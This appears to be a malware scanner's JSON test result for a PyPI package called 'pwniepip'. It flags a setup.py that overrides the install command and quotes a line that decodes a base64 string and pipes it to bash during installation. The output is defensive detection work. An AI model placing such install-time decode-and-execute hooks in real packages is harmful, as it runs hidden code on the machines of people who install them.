@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='pwniepip',\n      version='0.0.2',\n      description='Pentesting POC',\n      url='https://github.com/lolwut',\n      author='yes',\n      author_email='ok@ok.com',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install...Install})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "        os.system('echo %s|base64 -d|bash' % encoded.decode())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pwniepip-0.0.2"
+}
